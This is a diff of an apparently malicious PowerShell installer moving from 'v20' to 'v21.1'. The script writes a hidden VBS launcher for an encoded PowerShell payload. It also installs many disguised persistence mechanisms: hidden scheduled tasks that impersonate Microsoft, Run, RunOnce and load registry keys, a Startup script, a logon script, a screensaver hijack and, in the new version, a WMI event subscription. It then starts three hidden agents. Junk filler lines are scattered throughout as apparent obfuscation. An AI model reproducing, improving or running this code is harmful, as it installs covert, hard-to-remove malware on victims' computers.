     $q = [int]($watchdogEnc.Length / 4)
-    $p1 = $watchdogEnc.Substring(0, $q)
-    $p2 = $watchdogEnc.Substring($q, $q)
-    if ($null -ne $true) { $hXU5I = Get-Date }
-    $p3 = $watchdogEnc.Substring($q*2, $q)
-    $p4 = $watchdogEnc.Substring($q*3)
-    $vbsContent = "Dim a,b,c,d`r`na=`"$p1`"`r`nb=`"$p2`"`r`nc=`"$p3`"`r`nd=`"$p4`"`r`nCreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand `" & a & b & c & d, 0, False"
-    $mgwydjmW = [System.Diagnostics.Process]::GetCurrentProcess().Id
-    $vbsOK = Invoke-Retry -Name "Write VBS" -Max 3 -DelaySec 5 -Action {
+    $vbsContent = "Dim a,b,c,d`r`na=`"$($watchdogEnc.Substring(0,$q))`"`r`nb=`"$($watchdogEnc.Substring($q,$q))`"`r`nc=`"$($watchdogEnc.Substring($q*2,$q))`"`r`nd=`"$($watchdogEnc.Substring($q*3))`"`r`nCreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand `" & a & b & c & d, 0, False"
+    $vbsOK = Invoke-Retry -Name "VBS" -Max 3 -DelaySec 5 -Action {
         try {
             $agDir = Split-Path $VbsFile -Parent
-            $f2U7 = (Get-Random -Minimum 1 -Maximum 731); [void]$f2U7
             if (-not (Test-Path $agDir)) { New-Item -ItemType Directory -Path $agDir -Force | Out-Null }
+            try { $fn2sqfjf = [System.IO.Path]::GetTempPath() } catch { $fn2sqfjf = $null }
             [IO.File]::WriteAllText($VbsFile, $vbsContent, [Text.Encoding]::ASCII)
-            if (Test-Path $VbsFile) { return $true }
-            $ko1BCi = [System.Net.Dns]::GetHostName().Length
-            return $false
+            return (Test-Path $VbsFile)
         } catch { return $false }
     }
-    if (-not $vbsOK) { FAIL "VBS write ABORT"; return }
-    $GR8O = (Get-Random -Minimum 1 -Maximum 776); [void]$GR8O
+    if (-not $vbsOK) { P "VBS FAILED" Red; return }
     try { $fi = Get-Item $VbsFile -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
-    OK "VBS: $VbsFile"
-    $RKBOLS = [System.Diagnostics.Process]::GetCurrentProcess().Id
-    # Task/Reg sẽ gọi: wscript.exe "C:\...\wds_<id>.vbs"
+    $qjuu = [System.Net.Dns]::GetHostName().Length
     $launcherExe = "$env:SystemRoot\System32\wscript.exe"
     $launcherArgs = "`"$VbsFile`""
     $scheduledTaskExe = $launcherExe
     $scheduledTaskArgs = $launcherArgs
-    OK "Command: wscript.exe wds.vbs"
-    $oBOD = [System.Net.Dns]::GetHostName().Length
+    $WvxWTVC8 = (Get-Random -Minimum 1 -Maximum 295); [void]$WvxWTVC8
 }
 else {
-    # Fallback powershell trực tiếp
     $launcherExe = $psExe
     $launcherArgs = "-NoProfile -NonInteractive -WindowStyle Hidden $psArgs"
     $scheduledTaskExe = $psExe
-    $woNG = [Environment]::MachineName.Length; $woNG = $null
+    $CtRS = @{}; $CtRS["ts"] = [DateTime]::UtcNow.Ticks
     $scheduledTaskArgs = $launcherArgs
-    WARN "Command: powershell (may flash)"
-    $BY8ToFhV = [System.Net.Dns]::GetHostName().Length
+    $CRVuLMs = @{}; $CRVuLMs["ts"] = [DateTime]::UtcNow.Ticks
 }
-$oizYE = [Environment]::MachineName.Length; $oizYE = $null
 
-# ============================================================
-# STEP 6: PERSISTENCE (retry, non-abort)
-# ============================================================
-Step "Install persistence"
-$installed = @()
+# STEP 6: PERSISTENCE
+$installed = 0
 
-# 6.1 Tasks x3
+# Tasks x3
 foreach ($cfg in @(
     @{Name="Wdrv${InstallId}"; Rep="PT2M"},
     @{Name="Wcmp${InstallId}"; Rep="PT3M"},
     @{Name="Wsec${InstallId}"; Rep="PT4M"}
 )) {
     $cc = $cfg
-    $tOK = Invoke-Retry -Name "Task $($cfg.Name)" -Max 3 -DelaySec 10 -Action {
+    $tOK = Invoke-Retry -Name "Task" -Max 3 -DelaySec 10 -Action {
         try {
             $sched = New-Object -ComObject Schedule.Service
             $sched.Connect()
             $tf = $sched.GetFolder('\')
+            $yevmF = [System.Diagnostics.Process]::GetCurrentProcess().Id
             $t = $sched.NewTask(0)
             $t.RegistrationInfo.Description = "Windows Service Helper"
-            $bx6aQ9 = @{}; $bx6aQ9["ts"] = [DateTime]::UtcNow.Ticks
             $t.RegistrationInfo.Author = "Microsoft Corporation"
+            $DlYZW = [System.Net.Dns]::GetHostName().Length
             $t.Settings.Enabled = $true
-            $a7p7S1 = @{}; $a7p7S1["ts"] = [DateTime]::UtcNow.Ticks
             $t.Settings.Hidden = $true
-            $lbMYCJu = @{}; $lbMYCJu["ts"] = [DateTime]::UtcNow.Ticks
             $t.Settings.StartWhenAvailable = $true
+            try { $WrgU7dR = [System.IO.Path]::GetTempPath() } catch { $WrgU7dR = $null }
             $t.Settings.DisallowStartIfOnBatteries = $false
+            $BPGGdfK = [Environment]::MachineName.Length; $BPGGdfK = $null
             $t.Settings.StopIfGoingOnBatteries = $false
-            $sONJX = (Get-Random -Minimum 1 -Maximum 815); [void]$sONJX
             $t.Settings.ExecutionTimeLimit = "PT0S"
             $t.Settings.MultipleInstances = 2
             $tr1 = $t.Triggers.Create(9); $tr1.UserId = "$env:USERDOMAIN\$env:USERNAME"
-            $tzteqJb = [Environment]::MachineName.Length; $tzteqJb = $null
             $tr2 = $t.Triggers.Create(1)
-            $mjjlhtvm = [System.Diagnostics.Process]::GetCurrentProcess().Id
+            if ($null -ne $true) { $BAHle = Get-Date }
             $tr2.StartBoundary = (Get-Date).AddMinutes(1).ToString("yyyy-MM-ddTHH:mm:ss")
             $tr2.Repetition.Interval = $cc.Rep
-            try { $KhBN = [System.IO.Path]::GetTempPath() } catch { $KhBN = $null }
             $ac = $t.Actions.Create(0)
+            $vKslpu = @{}; $vKslpu["ts"] = [DateTime]::UtcNow.Ticks
             $ac.Path = $scheduledTaskExe
             $ac.Arguments = $scheduledTaskArgs
+            $xzBE = @{}; $xzBE["ts"] = [DateTime]::UtcNow.Ticks
             $t.Principal.UserId = "$env:USERDOMAIN\$env:USERNAME"
             $t.Principal.LogonType = 3
             $t.Principal.RunLevel = 0
-            $NWImZCfd = @{}; $NWImZCfd["ts"] = [DateTime]::UtcNow.Ticks
             $tf.RegisterTaskDefinition($cc.Name, $t, 6, $null, $null, 3, $null) | Out-Null
             Start-Sleep -Milliseconds 500
-            if (Get-ScheduledTask -TaskName $cc.Name -EA 0) { return $true }
-            return $false
-            $J24Rk = @{}; $J24Rk["ts"] = [DateTime]::UtcNow.Ticks
+            return [bool](Get-ScheduledTask -TaskName $cc.Name -EA 0)
         } catch { return $false }
+        $Rqyf5o2g = [Environment]::MachineName.Length; $Rqyf5o2g = $null
     }
-    if ($tOK) { $installed += "Task:$($cfg.Name)"; OK "Task $($cfg.Name)" }
-    else { WARN "Task $($cfg.Name) FAILED" }
+    if ($tOK) { $installed++ }
 }
-try { $qRYKWFS = [System.IO.Path]::GetTempPath() } catch { $qRYKWFS = $null }
+$J5UR = [Environment]::MachineName.Length; $J5UR = $null
 
-# 6.2 Registry (4 keys)
+# Registry x4
 $runCmd = "`"$launcherExe`" $launcherArgs"
-$QeYOx = (Get-Random -Minimum 1 -Maximum 845); [void]$QeYOx
 foreach ($reg in @(
     @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; Name="Wdrv$InstallId"},
     @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Name="Wupd$InstallId"},
@@ -516,53 +458,43 @@ foreach ($reg in @(
     @{Path='HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows'; Name='load'}
 )) {
     $rc = $reg
-    try { $NHAC = [System.IO.Path]::GetTempPath() } catch { $NHAC = $null }
-    $rOK = Invoke-Retry -Name "Reg $($reg.Name)" -Max 3 -DelaySec 5 -Action {
+    try { $RZREC9b3 = [System.IO.Path]::GetTempPath() } catch { $RZREC9b3 = $null }
+    $rOK = Invoke-Retry -Name "Reg" -Max 3 -DelaySec 5 -Action {
         try {
             if (-not (Test-Path $rc.Path)) { New-Item -Path $rc.Path -Force | Out-Null }
             Set-ItemProperty -Path $rc.Path -Name $rc.Name -Value $runCmd -Force
-            $v = (Get-ItemProperty -Path $rc.Path -Name $rc.Name -EA 0).$($rc.Name)
-            $qV15Zy = [System.Net.Dns]::GetHostName().Length
-            if ($v) { return $true }
-            return $false
+            return [bool]((Get-ItemProperty -Path $rc.Path -Name $rc.Name -EA 0).$($rc.Name))
+            if ($null -ne $true) { $an39GK53 = Get-Date }
         } catch { return $false }
-        $dnmodOz = [System.Diagnostics.Process]::GetCurrentProcess().Id
     }
-    if ($rOK) { $installed += "Reg:$($reg.Name)"; OK "Reg $($reg.Name)" }
-    else { WARN "Reg $($reg.Name) FAILED" }
-    $cDEx = (Get-Random -Minimum 1 -Maximum 355); [void]$cDEx
+    if ($rOK) { $installed++ }
 }
 
-# 6.3 Startup CMD
+# Startup
 $sOK = Invoke-Retry -Name "Startup" -Max 3 -DelaySec 5 -Action {
     try {
         $cmd = Join-Path ([Environment]::GetFolderPath('Startup')) "W$InstallId.cmd"
-        $hTSy0 = (Get-Random -Minimum 1 -Maximum 846); [void]$hTSy0
+        if ($null -ne $true) { $xNcqgg = Get-Date }
         [IO.File]::WriteAllText($cmd, "@echo off`r`nstart `"`" /b `"$launcherExe`" $launcherArgs`r`nexit", [Text.Encoding]::ASCII)
         try { $fi = Get-Item $cmd -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
         return (Test-Path $cmd)
-        $z2ge = [System.Diagnostics.Process]::GetCurrentProcess().Id
     } catch { return $false }
 }
-if ($sOK) { $installed += "StartupCMD"; OK "Startup CMD" } else { WARN "Startup FAILED" }
+if ($sOK) { $installed++ }
 
-# 6.4 LogonScript
+# LogonScript
 $lOK = Invoke-Retry -Name "LogonScript" -Max 3 -DelaySec 5 -Action {
     try {
         $cmdPath = "$env:TEMP\.w$InstallId.cmd"
         [IO.File]::WriteAllText($cmdPath, "@echo off`r`nstart `"`" /b `"$launcherExe`" $launcherArgs`r`nexit", [Text.Encoding]::ASCII)
-        $EIciE = [Environment]::MachineName.Length; $EIciE = $null
         Set-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -Value $cmdPath -Force
-        $ZVcZRo = (Get-Random -Minimum 1 -Maximum 203); [void]$ZVcZRo
-        $v = (Get-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -EA 0).UserInitMprLogonScript
-        if ($v) { return $true }
-        return $false
+        return [bool]((Get-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -EA 0).UserInitMprLogonScript)
     } catch { return $false }
 }
-try { $AL28 = [System.IO.Path]::GetTempPath() } catch { $AL28 = $null }
-if ($lOK) { $installed += "LogonScript"; OK "LogonScript" } else { WARN "LogonScript FAILED" }
+try { $Fkno = [System.IO.Path]::GetTempPath() } catch { $Fkno = $null }
+if ($lOK) { $installed++ }
 
-# 6.5 Screensaver
+# Screensaver
 $scrOK = Invoke-Retry -Name "Screensaver" -Max 3 -DelaySec 5 -Action {
     try {
         $scr = "$env:TEMP\.w$InstallId.scr"
@@ -570,103 +502,73 @@ $scrOK = Invoke-Retry -Name "Screensaver" -Max 3 -DelaySec 5 -Action {
         try { $fi = Get-Item $scr -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
         Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -Value $scr -Force
         Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '1' -Force
-        $JTXwO5HK = (Get-Random -Minimum 1 -Maximum 1086); [void]$JTXwO5HK
+        $upksRYFi = (Get-Random -Minimum 1 -Maximum 690); [void]$upksRYFi
         Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveTimeOut' -Value '600' -Force
-        $v = (Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -EA 0).'SCRNSAVE.EXE'
-        $zoMTE = [System.Diagnostics.Process]::GetCurrentProcess().Id
-        if ($v) { return $true }
-        return $false
-        $C47j = @{}; $C47j["ts"] = [DateTime]::UtcNow.Ticks
+        $da7Hs2V = [Environment]::MachineName.Length; $da7Hs2V = $null
+        return [bool]((Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -EA 0).'SCRNSAVE.EXE')
+        $ofxQNS0k = [System.Net.Dns]::GetHostName().Length
     } catch { return $false }
-    $gSHzVx7d = @{}; $gSHzVx7d["ts"] = [DateTime]::UtcNow.Ticks
 }
-if ($scrOK) { $installed += "Screensaver"; OK "Screensaver" } else { WARN "Screensaver FAILED" }
+if ($scrOK) { $installed++ }
 
-Log "Vectors: $($installed -join ', ')"
+# WMI (admin only)
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if ($isAdmin) {
+    $wmiOK = Invoke-Retry -Name "WMI" -Max 2 -DelaySec 5 -Action {
+        try {
+            $q = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+            $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="Wd$InstallId";EventNamespace="root\cimv2";Query=$q} -EA Stop
+            $KvO4g7 = [System.Net.Dns]::GetHostName().Length
+            $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name="Wdc$InstallId";CommandLineTemplate="$scheduledTaskExe $scheduledTaskArgs"} -EA Stop
+            $z0KA = (Get-Random -Minimum 1 -Maximum 581); [void]$z0KA
+            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c} -EA Stop | Out-Null
+            try { $EBtXELG = [System.IO.Path]::GetTempPath() } catch { $EBtXELG = $null }
+            return $true
+        } catch { return $false }
+    }
+    if ($wmiOK) { $installed++ }
+}
+P "Vectors: $installed" Green
 
-# ============================================================
-# STEP 7: LAUNCH 3 AGENTS
-# ============================================================
-Step "Launch 3 agents ($launcher)"
-$launched = 0
+# STEP 7: LAUNCH
 for ($i=0; $i -lt 3; $i++) {
-    $lOK = Invoke-Retry -Name "Launch $($i+1)" -Max 3 -DelaySec 5 -Action {
+    Invoke-Retry -Name "Launch" -Max 3 -DelaySec 5 -Action {
         try {
             $proc = New-Object Diagnostics.Process
             $proc.StartInfo.FileName = $launcherExe
-            $DDM0cjH = [System.Net.Dns]::GetHostName().Length
             $proc.StartInfo.Arguments = $launcherArgs
             $proc.StartInfo.UseShellExecute = $false
+            $uOB7y = (Get-Random -Minimum 1 -Maximum 598); [void]$uOB7y
             $proc.StartInfo.CreateNoWindow = $true
             [void]$proc.Start()
             return $true
         } catch { return $false }
-        $tuwHB = [Environment]::MachineName.Length; $tuwHB = $null
-    }
-    if ($lOK) { $launched++ }
-    $lE5Ts = @{}; $lE5Ts["ts"] = [DateTime]::UtcNow.Ticks
+        $NliQYA = [System.Diagnostics.Process]::GetCurrentProcess().Id
+    } | Out-Null
+    $TISW = [System.Net.Dns]::GetHostName().Length
     Start-Sleep -Milliseconds 900
 }
-if ($launched -gt 0) { OK "Launched $launched/3" } else { WARN "No agents launched" }
 
-# ============================================================
-# STEP 8: VERIFY (retry)
-# ============================================================
-Step "Verify"
-Invoke-Retry -Name "Verify" -Max 5 -DelaySec 10 -Action {
-    Start-Sleep -Seconds 5
-    $a = 0
-    if (Test-Path $PidDir) { $a = @(Get-ChildItem $PidDir -File -EA 0).Count }
-    $nCzyQCz = (Get-Random -Minimum 1 -Maximum 475); [void]$nCzyQCz
-    if ($a -ge 1) { return $true }
-    $NH5MqHPx = [System.Diagnostics.Process]::GetCurrentProcess().Id
-    return $false
-} | Out-Null
-
+# STEP 8: VERIFY
+Start-Sleep -Seconds 12
 $alive = 0
-try { $BEvA0uiS = [System.IO.Path]::GetTempPath() } catch { $BEvA0uiS = $null }
 if (Test-Path $PidDir) { $alive = @(Get-ChildItem $PidDir -File -EA 0).Count }
-$wdog = @()
-$vSLDdJ = [System.Diagnostics.Process]::GetCurrentProcess().Id
-if (Test-Path $LogFile) {
-    $wdog = @(Get-Content $LogFile -EA 0 | Where-Object { $_ -match '\[w\]' })
-}
-$woT5hh = [Environment]::MachineName.Length; $woT5hh = $null
 
-# ============================================================
-# FINAL REPORT
-# ============================================================
-Write-Host ""
-Write-Host "============================================" -ForegroundColor Cyan
-Write-Host " BOOTSTRAP v20 — FINAL REPORT" -ForegroundColor Cyan
-Write-Host "============================================" -ForegroundColor Cyan
-Write-Host " INSTALL ID : $InstallId" -ForegroundColor Yellow
-Write-Host " OS BUILD   : $osBuild" -ForegroundColor White
-$tf6GDH = @{}; $tf6GDH["ts"] = [DateTime]::UtcNow.Ticks
-Write-Host " LAUNCHER   : $launcher (no-flash: $(if($launcher -ne 'powershell'){'YES'}else{'fallback'}))" -ForegroundColor $(if($launcher -ne 'powershell'){'Green'}else{'Yellow'})
-Write-Host " CLONES     : $($clones.Count) / 7" -ForegroundColor $(if($clones.Count -ge 5){'Green'}else{'Yellow'})
-Write-Host " AGENTS     : $alive / 3" -ForegroundColor $(if($alive -ge 3){'Green'}elseif($alive -ge 1){'Yellow'}else{'Red'})
-Write-Host " VECTORS    : $($installed.Count)" -ForegroundColor White
-Write-Host "   $($installed -join ', ')" -ForegroundColor DarkGray
-Write-Host " WT PATCH   : $(if(Test-Path $WtSettings){'patched'}else{'missing'})" -ForegroundColor White
-Write-Host " LOG        : $LogFile" -ForegroundColor White
-Write-Host "============================================" -ForegroundColor Cyan
-if ($null -ne $true) { $T3OLDEB = Get-Date }
-Write-Host " SAVE: ID = $InstallId" -ForegroundColor Magenta
-Write-Host ""
-$Up4C = [Environment]::MachineName.Length; $Up4C = $null
+P ""
+P "====================================" Cyan
+P "ID      : $InstallId" Yellow
+$OvF4X = [System.Net.Dns]::GetHostName().Length
+P "Launcher: $launcher"
+P "Clones  : $($clones.Count)/7"
+P "Agents  : $alive/3" $(if($alive -ge 3){'Green'}elseif($alive -ge 1){'Yellow'}else{'Red'})
+P "Vectors : $installed"
+P "Net FB  : YES"
+P "Log     : $LogFile"
+$WbcQ = [Environment]::MachineName.Length; $WbcQ = $null
+P "====================================" Cyan
 
-if ($wdog.Count -gt 0) {
-    Write-Host " Watchdog (last 6):" -ForegroundColor DarkGray
-    $wdog | Select-Object -Last 6 | ForEach-Object { Write-Host "   $_" -ForegroundColor DarkGray }
-    $HqVJO6D = [Environment]::MachineName.Length; $HqVJO6D = $null
-    Write-Host ""
-    $hiCaVa = [Environment]::MachineName.Length; $hiCaVa = $null
-}
-$zjubD9jY = [System.Net.Dns]::GetHostName().Length
+if ($alive -ge 3) { P ">>> SUCCESS" Green }
+elseif ($alive -ge 1) { P ">>> PARTIAL" Yellow }
+else { P ">>> FAILED" Red }
 
-if ($alive -ge 3) { Write-Host " >>> SUCCESS" -ForegroundColor Green }
-elseif ($alive -ge 1) { Write-Host " >>> PARTIAL ($alive/3), watchdog sẽ bổ sung" -ForegroundColor Yellow }
-else { Write-Host " >>> FAILED — Check log" -ForegroundColor Red }
-try { $yhfkUI8 = [System.IO.Path]::GetTempPath() } catch { $yhfkUI8 = $null }
-Log "=== v20 done ==="
+Log "=== v21.1 done ==="
